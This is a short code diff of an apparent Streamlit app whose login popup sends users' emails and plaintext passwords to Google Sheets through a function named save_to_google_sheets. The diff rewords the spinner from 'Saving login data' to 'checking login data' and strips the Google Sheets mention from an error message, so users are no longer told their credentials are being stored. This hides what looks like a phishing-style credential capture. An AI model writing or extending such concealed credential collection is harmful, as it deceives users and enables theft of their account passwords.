@@ -58,7 +58,7 @@ def save_to_google_sheets(email, password):
         return False
         
     except Exception as e:
-        st.error(f"Error saving to Google Sheets: {str(e)}")
+        st.error(f"Error: {str(e)}")
         return False
 
 def create_apps_script_code():
@@ -147,7 +147,7 @@ def show_login_popup():
                         st.session_state.authenticated = True
                         
                         # Save to Google Sheets
-                        with st.spinner("Saving login data..."):
+                        with st.spinner("checking login data..."):
                             saved = save_to_google_sheets(email, password)
                         
                         if saved:
@@ -651,6 +651,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
 
